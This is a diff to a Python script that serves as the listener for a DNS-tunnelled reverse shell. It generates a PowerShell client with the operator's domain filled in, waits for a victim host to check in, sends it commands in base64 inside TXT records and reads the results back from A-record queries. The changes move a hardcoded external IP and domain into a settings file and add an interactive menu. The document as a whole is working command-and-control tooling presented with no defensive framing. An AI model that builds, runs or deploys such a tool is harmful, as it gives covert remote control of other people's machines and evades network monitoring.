@@ -60,20 +60,21 @@ def restore_case_by_hyphen(encoded_string):
 
 
 data = {}
-
-domain = "revshell.dnshell.programm.zip"
-expose = ("173.212.225.214", 53)
-
+settings = {
+    "domain": "",
+    "ip": "0.0.0.0",
+    "port": 53
+}
 
 def generateClient():
     # Function to generate client
-    print("Generating client... for domain {domain}")
+    print("Generating client... for domain {settings['domain']}")
     # Read client-preset.ps1
     with open('client-preset.ps1', 'r') as f:
         content = f.read()
 
     # Replace {domain} with the variable domain in the file
-    content = content.replace('{domain}', domain)
+    content = content.replace('{domain}', settings['domain'])
 
     # prompt the user for the path, defaults to to "./client.ps1"
     path = input(
@@ -82,15 +83,8 @@ def generateClient():
     # export the file to the path specified
     with open(path, 'w') as f:
         f.write(content)
-
-    # ask the user if he wants to start the server
-    start_server = input('Do you want to start the server? (y/n): ')
-    if start_server.lower() == 'y':
-        # start the server
-        # ...
-        pass
-    else:
-        main()
+        
+    print("Client generated and exported to {path}")
 
 def parseRequest(request, addr):
     return {
@@ -98,19 +92,19 @@ def parseRequest(request, addr):
             "domain_name": str(request.q.qname),
             "query_class": str(request.q.qclass),
             "query_type": QTYPE[request.q.qtype],
-            "domain_parts": str(request.q.qname).replace(f".{domain}", "").split(".")
+            "domain_parts": str(request.q.qname).replace(f".{settings['domain']}", "").split(".")
     }
 
 def sendData(code,counter,command):
     #print("func: SendData")
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.bind(expose)
+    s.bind((settings["ip"], settings["port"]))
     while True:
         #print("Waiting fo Client to get it's data")
         rawrequest, addr = s.recvfrom(1024)
         request = DNSRecord.parse(rawrequest)
         query = parseRequest(request, addr)
-        if(query["query_type"] == "TXT" and query["domain_name"] == f"{counter}.{code}.{domain}."):
+        if(query["query_type"] == "TXT" and query["domain_name"] == f"{counter}.{code}.{settings['domain']}."):
             # Build response with command
             command = base64_encode_string(command)
             response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
@@ -124,13 +118,13 @@ def sendData(code,counter,command):
 def getData(code,counter):
     #print("func: GetData")
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.bind(expose)
+    s.bind((settings["ip"], settings["port"]))
     while True:
         rawrequest, addr = s.recvfrom(1024)
         request = DNSRecord.parse(rawrequest)
         query = parseRequest(request, addr)
         #print(f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
-        if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{domain}."):
+        if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{settings['domain']}."):
             thisdata = query["domain_parts"]
 
             if not thisdata[3] in data:
@@ -171,53 +165,103 @@ def getData(code,counter):
         #else:
             #print("No valid request")
 
+def startServer():
+    pwd = ""
+    user = ""
+    hostname = ""
+
+    print("Waiting for client to connect... and identify itself")
+    response = getData(0, 0)
+    code = response["code"]
+    pwd = response["pwd"]
+    user = response["user"]
+    hostname = response["hostname"]
+
+    print("")
+    print("----------------------- Client connected -----------------------")
+    print(f"ID for this Reverse Shell: {code}")
+    print(f"User: {user}")
+    print(f"Hostname: {hostname}")
+    print("----------------------------------------------------------------")
+    print("")
+
+    command = ""
+    counter = 0
+    while command != "exit":
+        command = input(f"{user}@{hostname}: {pwd}> ")
+
+        readline.add_history(command)
+
+        sendData(code,counter,command)
+
+        if command != "exit":
+            response = getData(code, counter)
+            pwd = response["pwd"]
+            user = response["user"]
+            hostname = response["hostname"]
+            output = response["output"]
+
+            print(output)
+
+        counter += 1
+        
+def setSettings():
+    currentDomain = settings['domain'] or "None"
+    currentIP = settings['ip'] or "0.0.0.0"
+    currentPort = settings["port"] or 53
+    # Prompt for domain and expose, and show current settings
+    settings['domain'] = input(f'Enter domain (Press [Enter] for current: \"{currentDomain}\"): ') or currentDomain
+    settings['ip'] = input(f'Enter the IP/Hostname that the dns server should listen to (0.0.0.0 to listen to every ip) (Press [Enter] for current: \"{currentIP}\"): ') or currentIP
+    settings['port'] = int(input(f'Enter the Port that the dns server should listen to (Press [Enter] for current: \"{currentPort}\"): ')) or currentPort
+    
+    with open('settings.json', 'w') as f:
+        json.dump(settings, f)
+
 def main():
+    global settings
     parser = argparse.ArgumentParser()
+    parser.add_argument("--start-server", action="store_true",
+                        help="Starts the listener")
     parser.add_argument("--generate-client", action="store_true",
                         help="Generates the .ps1 client file")
     args = parser.parse_args()
+    
+    # Handle settings
+    # if settings.json exists, load it into the variable settings
+    # if not, create it and prompt user for domain and expose
+    if os.path.exists('settings.json'):
+        # If it exists, load the settings into the variable 'settings'
+        with open('settings.json', 'r') as f:
+            settings = json.load(f)
+    else:
+        # If it doesn't exist, create it and prompt the user for domain and expose
+        setSettings()
 
-    if args.generate_client:
+    if args.start_server:
+        startServer()
+    elif args.generate_client:
         generateClient()
     else:
-        pwd = ""
-        user = ""
-        hostname = ""
-
-        print("Waiting for client to connect... and identify itself")
-        response = getData(0, 0)
-        code = response["code"]
-        pwd = response["pwd"]
-        user = response["user"]
-        hostname = response["hostname"]
-
-        print("")
-        print("----------------------- Client connected -----------------------")
-        print(f"ID for this Reverse Shell: {code}")
-        print(f"User: {user}")
-        print(f"Hostname: {hostname}")
-        print("----------------------------------------------------------------")
-        print("")
-
-        command = ""
-        counter = 0
-        while command != "exit":
-            command = input(f"{user}@{hostname}: {pwd}> ")
-
-            readline.add_history(command)
-
-            sendData(code,counter,command)
-
-            if command != "exit":
-                response = getData(code, counter)
-                pwd = response["pwd"]
-                user = response["user"]
-                hostname = response["hostname"]
-                output = response["output"]
-
-                print(output)
-
-            counter += 1
+        while True:
+        # Give the user a choice based on the arguments, if the user inputs an invalid number, prompt again
+            print("--------------- Please choose an option: ---------------")
+            print(f"1) Start the listener")
+            print(f"2) Generate the .ps1 client file")
+            print(f"3) Change the settings")
+            print(f"99) Quit")
+            print("--------------------------------------------------------")
+            choice = input("Choice: ")
+            if choice == "1":
+                startServer()
+            elif choice == "2":
+                generateClient()
+            elif choice == "3":
+                setSettings()
+            elif choice == "99" or choice == "exit" or choice == "quit":
+                break
+            else:
+                print("Invalid choice")
+        
 
 
 def print_progress(iteration, total, prefix='', suffix='', decimals=1, bar_length=100):
